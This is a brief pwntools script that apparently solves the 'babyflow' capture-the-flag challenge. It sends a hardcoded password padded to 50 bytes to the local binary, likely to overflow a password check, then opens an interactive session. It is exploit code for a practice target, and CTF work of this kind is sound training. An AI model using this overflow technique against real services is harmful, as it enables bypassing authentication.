#!/usr/bin/python3

from pwn import *
# p = remote('babyflow.ctf.intigriti.io', 1331)
p = process('./babyflow')
passwd = b'SuPeRsEcUrEPaSsWoRd123'
passwd = passwd.ljust(50)

p.send(passwd)


p.interactive()
